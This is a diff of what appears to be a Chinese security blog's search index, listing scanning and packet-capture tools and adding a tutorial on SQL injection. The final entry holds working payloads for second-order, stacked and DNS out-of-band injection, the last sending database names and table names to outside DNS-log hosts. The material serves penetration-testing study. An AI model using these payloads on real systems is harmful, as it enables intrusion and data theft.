       <categories>
         <category>基础入门</category>
       </categories>
@@ -2386,6 +2369,19 @@
       </categories>
   </entry>
   <entry>
+    <title>7kbscan-WebPathBrute</title>
+    <url>/2024/03/15/%E5%B7%A5%E5%85%B77kbscan-WebPathBrute/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">7kbscan-WebPathBrute</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>7kbscan旨在快速扫描网站下的目录</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>目录扫描</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ARL</title>
     <url>/2024/03/11/%E5%B7%A5%E5%85%B7ARL/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/TophantTechnology/ARL">ARL</a><br><br></p>
@@ -2405,19 +2401,6 @@
       </categories>
       <tags>
         <tag>综合架构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>7kbscan-WebPathBrute</title>
-    <url>/2024/03/15/%E5%B7%A5%E5%85%B77kbscan-WebPathBrute/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">7kbscan-WebPathBrute</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>7kbscan旨在快速扫描网站下的目录</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>目录扫描</tag>
       </tags>
   </entry>
   <entry>
@@ -2483,6 +2466,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Charles</title>
+    <url>/2024/03/10/%E5%B7%A5%E5%85%B7Charles/</url>
+    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.charlesproxy.com/">Charles</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>Charles是一个HTTP代理服务器，HTTP监视器，反转代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收数据。它允许一个开发者查看所有连接互联网的HTTP通信，这些包括request, response和headers（包含cookies信息）。</p>
+<p><strong>tcpdump</strong>：是可以将网络中传送的数据包截获下来并分析。它针对网络层，协议，主机，网络或端口的过滤，并提供and，or，not等逻辑语句来去掉无用的信息。<br><br></p>
+<h2 id="证书下载"><a href="#证书下载" class="headerlink" title="证书下载"></a>证书下载</h2><ol>
+<li>Help -&gt; SSL Proxying -&gt; Save Charles Root Certificate</li>
+<li>保存为Charles.pem<br>
+<br></li>
+</ol>
+<h2 id="逍遥模拟器证书"><a href="#逍遥模拟器证书" class="headerlink" title="逍遥模拟器证书"></a>逍遥模拟器证书</h2><ol>
+<li>共享 -&gt; 音乐共享路径win，把证书复制粘贴进来</li>
+<li>设置 -&gt; 安全性和位置信息 -&gt; 加密与凭据 -&gt; 从SD卡安装 -&gt; Music，然后点击安装证书<br>
+<br></li>
+</ol>
+<h2 id="安装Chrome证书"><a href="#安装Chrome证书" class="headerlink" title="安装Chrome证书"></a>安装Chrome证书</h2><ol>
+<li>设置 -&gt; 搜索证书 -&gt; 安全 -&gt; 管理证书 -&gt; 安装到中间证书颁发机构，受信任的根证书颁发机构</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>抓包</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ENScan_GO</title>
     <url>/2024/03/11/%E5%B7%A5%E5%85%B7ENScan_GO/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a><br><br></p>
@@ -2505,22 +2515,21 @@
       </tags>
   </entry>
   <entry>
-    <title>Charles</title>
-    <url>/2024/03/10/%E5%B7%A5%E5%85%B7Charles/</url>
-    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.charlesproxy.com/">Charles</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>Charles是一个HTTP代理服务器，HTTP监视器，反转代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收数据。它允许一个开发者查看所有连接互联网的HTTP通信，这些包括request, response和headers（包含cookies信息）。</p>
-<p><strong>tcpdump</strong>：是可以将网络中传送的数据包截获下来并分析。它针对网络层，协议，主机，网络或端口的过滤，并提供and，or，not等逻辑语句来去掉无用的信息。<br><br></p>
-<h2 id="证书下载"><a href="#证书下载" class="headerlink" title="证书下载"></a>证书下载</h2><ol>
-<li>Help -&gt; SSL Proxying -&gt; Save Charles Root Certificate</li>
-<li>保存为Charles.pem<br>
+    <title>Fiddler</title>
+    <url>/2024/03/10/%E5%B7%A5%E5%85%B7Fiddler/</url>
+    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.telerik.com/fiddler">Fiddler</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>Fiddler是一个HTTP协议调试代理工具，它能够记录并检查电脑和互联网之间的HTTP通讯，设置断点，查看进出Fiddler的数据（指cookie, HTML, JS, CSS等文件）。<br><br></p>
+<h2 id="证书下载："><a href="#证书下载：" class="headerlink" title="证书下载："></a>证书下载：</h2><ol>
+<li>Tools -&gt; Options -&gt; HTTPS -&gt; Actions -&gt; Export Root Certificate to Desktop</li>
+<li>保存为FiddlerRoot.cer<br>
 <br></li>
 </ol>
-<h2 id="逍遥模拟器证书"><a href="#逍遥模拟器证书" class="headerlink" title="逍遥模拟器证书"></a>逍遥模拟器证书</h2><ol>
+<h2 id="安装模拟器证书："><a href="#安装模拟器证书：" class="headerlink" title="安装模拟器证书："></a>安装模拟器证书：</h2><ol>
 <li>共享 -&gt; 音乐共享路径win，把证书复制粘贴进来</li>
-<li>设置 -&gt; 安全性和位置信息 -&gt; 加密与凭据 -&gt; 从SD卡安装 -&gt; Music，然后点击安装证书<br>
+<li>设置 -&gt; 安全性和位置信息 -&gt; 加密与凭据 -&gt; 从SD卡安装 -&gt; Music<br>
 <br></li>
 </ol>
-<h2 id="安装Chrome证书"><a href="#安装Chrome证书" class="headerlink" title="安装Chrome证书"></a>安装Chrome证书</h2><ol>
+<h2 id="安装Chrome证书："><a href="#安装Chrome证书：" class="headerlink" title="安装Chrome证书："></a>安装Chrome证书：</h2><ol>
 <li>设置 -&gt; 搜索证书 -&gt; 安全 -&gt; 管理证书 -&gt; 安装到中间证书颁发机构，受信任的根证书颁发机构</li>
 </ol>
 ]]></content>
@@ -2551,49 +2560,6 @@
       </tags>
   </entry>
   <entry>
-    <title>IIS_shortname_Scanner-master</title>
-    <url>/2024/03/15/%E5%B7%A5%E5%85%B7IIS-shortname-Scanner-master/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>IIS 短名称扫描器，在某些情况下，Windows 8.3短名称可能会在启用.net的IIS下被暴力枚举。此软件python版本比java版本好用。<br><br></p>
-<h2 id="使用流程："><a href="#使用流程：" class="headerlink" title="使用流程："></a>使用流程：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python iis_shortname_Scan.py target</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>IIS短文件漏洞利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>抓包技术&amp;全局协议&amp;封包监听&amp;网卡模式&amp;APP&amp;小程序&amp;PC应用</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A87/</url>
-    <content><![CDATA[<h2 id="实现目的："><a href="#实现目的：" class="headerlink" title="实现目的："></a>实现目的：</h2><ol>
-<li>掌握几种全局协议抓包工具的使用</li>
-<li>学会App，小程序，PC应用等协议抓包</li>
-<li>了解此课抓包是针对那些目标什么协议<br>
-<br></li>
-</ol>
-<h2 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h2><p>Wireshark是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并显示出详细的网络封包资料。Wireshark使用WinPcap作为接口，直接与网卡进行数据交换。<br><br></p>
-<h2 id="科来网络分析系统："><a href="#科来网络分析系统：" class="headerlink" title="科来网络分析系统："></a>科来网络分析系统：</h2><p>科来是一款由自主研发的网络分析产品。该系统具有专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障，网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障，安全及性能问题。<br><br></p>
-<h2 id="WPE封包分析："><a href="#WPE封包分析：" class="headerlink" title="WPE封包分析："></a>WPE封包分析：</h2><p>封包监听工具是网络封包编辑器，WPE可以截取网络上的信息，修改封包数据，是外挂制作的常用工具。一般在安全测试中用来调试数据通讯地址。<br><br></p>
-<p><strong>渗透测试角度</strong>：</p>
-<ol>
-<li>抓包得到应用的资产信息，IP域名等</li>
-<li>拿IP和域名上的服务做测试（Web攻防，端口，数据库等第三方软件）</li>
-<li>API接口，OSS资源<br>
-<br></li>
-</ol>
-<p><strong>逆向破解角度</strong>：</p>
-<ol>
-<li>反编译源码中去找资产信息 跟渗透测试思路一样</li>
-<li>源码中泄露的配置Key去测试安全性</li>
-<li>逆向检查代码和产品的设计逻辑性（不规范的加密，可以绕过的策略，自己可以删除验证重新打包绕过验证等）</li>
-</ol>
-]]></content>
-      <categories>
-        <category>基础入门</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Github-Monitor</title>
     <url>/2024/03/11/%E5%B7%A5%E5%85%B7Github-Monitor/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a><br><br></p>
@@ -2611,32 +2577,6 @@
       </categories>
       <tags>
         <tag>Github监控</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Fiddler</title>
-    <url>/2024/03/10/%E5%B7%A5%E5%85%B7Fiddler/</url>
-    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.telerik.com/fiddler">Fiddler</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>Fiddler是一个HTTP协议调试代理工具，它能够记录并检查电脑和互联网之间的HTTP通讯，设置断点，查看进出Fiddler的数据（指cookie, HTML, JS, CSS等文件）。<br><br></p>
-<h2 id="证书下载："><a href="#证书下载：" class="headerlink" title="证书下载："></a>证书下载：</h2><ol>
-<li>Tools -&gt; Options -&gt; HTTPS -&gt; Actions -&gt; Export Root Certificate to Desktop</li>
-<li>保存为FiddlerRoot.cer<br>
-<br></li>
-</ol>
-<h2 id="安装模拟器证书："><a href="#安装模拟器证书：" class="headerlink" title="安装模拟器证书："></a>安装模拟器证书：</h2><ol>
-<li>共享 -&gt; 音乐共享路径win，把证书复制粘贴进来</li>
-<li>设置 -&gt; 安全性和位置信息 -&gt; 加密与凭据 -&gt; 从SD卡安装 -&gt; Music<br>
-<br></li>
-</ol>
-<h2 id="安装Chrome证书："><a href="#安装Chrome证书：" class="headerlink" title="安装Chrome证书："></a>安装Chrome证书：</h2><ol>
-<li>设置 -&gt; 搜索证书 -&gt; 安全 -&gt; 管理证书 -&gt; 安装到中间证书颁发机构，受信任的根证书颁发机构</li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>抓包</tag>
       </tags>
   </entry>
   <entry>
@@ -2661,6 +2601,19 @@
       </categories>
       <tags>
         <tag>Github监控</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IIS_shortname_Scanner-master</title>
+    <url>/2024/03/15/%E5%B7%A5%E5%85%B7IIS-shortname-Scanner-master/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>IIS 短名称扫描器，在某些情况下，Windows 8.3短名称可能会在启用.net的IIS下被暴力枚举。此软件python版本比java版本好用。<br><br></p>
+<h2 id="使用流程："><a href="#使用流程：" class="headerlink" title="使用流程："></a>使用流程：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python iis_shortname_Scan.py target</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>IIS短文件漏洞利用</tag>
       </tags>
   </entry>
   <entry>
@@ -2705,33 +2658,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Sqlmap</title>
-    <url>/2024/03/15/%E5%B7%A5%E5%85%B7sqlmap-master/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/sqlmapproject/sqlmap">Sqlmap</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>sqlmap 是一个开源渗透测试工具，可以自动执行检测和利用 SQL 注入缺陷以及接管数据库服务器的过程。 它配备了强大的检测引擎、最终渗透测试仪的许多利基功能以及广泛的开关，包括数据库指纹、从数据库获取数据、访问底层文件系统以及通过输出在操作系统上执行命令。 带外连接。<br><br></p>
-<h2 id="使用流程："><a href="#使用流程：" class="headerlink" title="使用流程："></a>使用流程：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>404星链项目</title>
-    <url>/2024/03/12/%E9%A1%B9%E7%9B%AE404%E6%98%9F%E9%93%BE/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/knownsec/404StarLink">404StarLink</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>「404星链计划」是知道创宇 404 实验室于 2020 年 8 月开始的计划，主要目的是改善安全圈内工具庞杂、水平层次不齐、开源无人维护的多种问题，促进安全开源社区的发展；通过这种方式将不同安全领域研究人员与开源项目链接起来。</p>
-<p>星链计划将不断地收集优秀的安全开源项目，对收录的项目提供技术支持，持续跟踪和展示项目的更新和动态，并建立了星链计划社区，社区用户可以通过星链展示板块探索自己感兴趣的项目，同时还可以在社区内快速为开源作者反馈问题。以此方式帮助开源项目成长，促进安全社区发展。</p>
-]]></content>
-      <categories>
-        <category>项目</category>
-      </categories>
-      <tags>
-        <tag>项目集合</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JS Link Finder, JS Miner, HaE和Unexpected.information</title>
     <url>/2024/03/11/%E6%8F%92%E4%BB%B6JS%20Link%20Finder,%20JS%20Miner,%20HaE%E5%92%8CUnexpected.information/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/gh0stkey/HaE">HaE</a><br><a href="https://github.com/ScriptKid-Beta/Unexpected_information">Unexpected_information</a><br><br></p>
@@ -2760,6 +2686,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Sqlmap</title>
+    <url>/2024/03/15/%E5%B7%A5%E5%85%B7sqlmap-master/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/sqlmapproject/sqlmap">Sqlmap</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>sqlmap 是一个开源渗透测试工具，可以自动执行检测和利用 SQL 注入缺陷以及接管数据库服务器的过程。 它配备了强大的检测引擎、最终渗透测试仪的许多利基功能以及广泛的开关，包括数据库指纹、从数据库获取数据、访问底层文件系统以及通过输出在操作系统上执行命令。 带外连接。<br><br></p>
+<h2 id="使用流程："><a href="#使用流程：" class="headerlink" title="使用流程："></a>使用流程：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>404星链项目</title>
+    <url>/2024/03/12/%E9%A1%B9%E7%9B%AE404%E6%98%9F%E9%93%BE/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/knownsec/404StarLink">404StarLink</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>「404星链计划」是知道创宇 404 实验室于 2020 年 8 月开始的计划，主要目的是改善安全圈内工具庞杂、水平层次不齐、开源无人维护的多种问题，促进安全开源社区的发展；通过这种方式将不同安全领域研究人员与开源项目链接起来。</p>
+<p>星链计划将不断地收集优秀的安全开源项目，对收录的项目提供技术支持，持续跟踪和展示项目的更新和动态，并建立了星链计划社区，社区用户可以通过星链展示板块探索自己感兴趣的项目，同时还可以在社区内快速为开源作者反馈问题。以此方式帮助开源项目成长，促进安全社区发展。</p>
+]]></content>
+      <categories>
+        <category>项目</category>
+      </categories>
+      <tags>
+        <tag>项目集合</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>红蓝队优秀工具项目集合</title>
     <url>/2024/03/11/%E9%A1%B9%E7%9B%AE%E7%BA%A2%E8%93%9D%E9%98%9F%E4%BC%98%E7%A7%80%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">All-Defense-Tool</a><br><br></p>
@@ -2771,5 +2724,55 @@
       <tags>
         <tag>项目集合</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>PHP应用&amp;SQL二次注入&amp;堆叠执行&amp;DNS带外&amp;功能点&amp;黑白盒条件</title>
+    <url>/2024/03/21/Web%E6%94%BB%E9%98%B25/</url>
+    <content><![CDATA[<h2 id="PHP-MYSQL-二次注入-DEMO-74CMS"><a href="#PHP-MYSQL-二次注入-DEMO-74CMS" class="headerlink" title="PHP-MYSQL-二次注入-DEMO&amp;74CMS"></a>PHP-MYSQL-二次注入-DEMO&amp;74CMS</h2><ol>
+<li>DEMO-用户注册登录修改密码</li>
+<li>CMS-74CMS个人中心简历功能</li>
+</ol>
+<p><strong>黑盒思路</strong>：分析代码功能，有INSERT后对数据操作的地方（功能点）<br><strong>白盒思路</strong>：INSERT后进入SELECT或UPDATE的功能的代码部分<br><strong>注入条件</strong>：插入时有转义的函数或配置，能过后续继续利用INSERT的数据<br><br></p>
+<p>登录后修改，系统会直接直接获取当前登录的用户名当修改条件</p>
+<p>如果此用户名在注册的时候是SQL注入语句，就能过提前将代码插入到数据中，然后当系统调用数据的时候，连接形成二次注入语句。需要注意，如果对面代码开了转移的函数，无法插入数据</p>
+<br>
+
+<p><strong>关键点</strong>：在插入的时候需要函数转义或者魔术开关转义，没有的话INSERT注入语句就都注入不进去</p>
+<p>首先得知道有没有转义，然后知道有没有单引号，括号，然后插入进去再找在哪触发，一般是看源码代码审计发现的。<br><br></p>
+<p>原本SQL语句：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">INSERT INTO <span class="built_in">users</span>(username，password) VALUES (<span class="string">&#x27;username&#x27;</span>, <span class="variable">$password</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>将在用户名处写的注入语句带入原本SQL语句</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;admin&#x27;</span> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">Insert into <span class="built_in">users</span>(username，password) vaules(<span class="string">&#x27;admin&#x27;</span> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<span class="comment">#&#x27;, $password&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>但是写入之后，#注释掉了之后的内容，导致password的参数传不上去，就会报错。但是如果去掉了单引号和后面的#号，这个注入语句能写入，但是是以字符串的形式写入的</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Insert into <span class="built_in">users</span>(username，password) vaules(<span class="string">&#x27;admin and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)&#x27;</span>, <span class="variable">$password</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>然后，系统将<code>admin and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</code>作为账号存入数据库</p>
+<p>函数转义或者魔术开关本意是为了拦截一次注入的，会将单引号前面加上\，注释掉单引号使攻击语句出错，但是这样就给了二次注入机会来插入到数据库中，然后再调用的数据的时候触发语句达成目的<br><br></p>
+<h2 id="PHP-MYSQL-堆叠注入-DEMO-CTF强网"><a href="#PHP-MYSQL-堆叠注入-DEMO-CTF强网" class="headerlink" title="PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网"></a>PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网</h2><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句</p>
+<p>例如PHP中的<code>mysqli_multi_query</code>函数和<code>mysqli_query()</code>函数。</p>
+<p>所以要想目标存在堆叠注入，在目标主机存在类似于mysqli_multi_query()这样的函数，根据数据库类型决定是否支持多条语句执行.<br><br></p>
+<p>例如：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.1.139:80/sqli/test.php?<span class="built_in">id</span>=1;create table cypher(personalid int);</span><br></pre></td></tr></table></figure>
+<br>
+
+
+<p><a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a><br><br></p>
+<p>1、目标存在sql注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条sql语句<br>支持堆叠数据库：MYSQL MSSQL Postgresql等</p>
+<h2 id="PHP-MYSQL-带外注入-DEMO-DNSLOG"><a href="#PHP-MYSQL-带外注入-DEMO-DNSLOG" class="headerlink" title="PHP-MYSQL-带外注入-DEMO&amp;DNSLOG"></a>PHP-MYSQL-带外注入-DEMO&amp;DNSLOG</h2><ol start="0">
+<li><p>注入条件<br>ROOT高权限且支持load_file()，需要同时满足两个要求，条件太苛刻了<br>有部分注入点是没有回显的，所有读取也是没回显的，所以采用带外</p>
+</li>
+<li><p>使用平台<br><a href="https://dig.pm/">https://dig.pm/</a></p>
+</li>
+<li><p>带外应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询当前数据库</span></span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.d7a64120ce.ipv6.1433.eu.org/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前版本</span></span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> version()),<span class="string">&#x27;.ac45c0ae7c.ipv6.1433.eu.org/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询其他数据库</span></span><br><span class="line"><span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> schema_name from information_schema.schemata <span class="built_in">limit</span> 0,1),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前数据库demo01中第一个表名</span></span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> <span class="built_in">limit</span> 0,1 ),<span class="string">&quot;.ac45c0ae7c.ipv6.1433.eu.org\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前数据库demo01中第二个表名</span></span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> <span class="built_in">limit</span> 1,1 ),<span class="string">&quot;.ac45c0ae7c.ipv6.1433.eu.org\\xxx.txt&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<br>limit 0,1 查询第一个数据库名<br>limit 1,1 查询第二个数据库名<br>limit 2,1 查询第三个数据库名</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Web攻防</category>
+      </categories>
   </entry>
 </search>
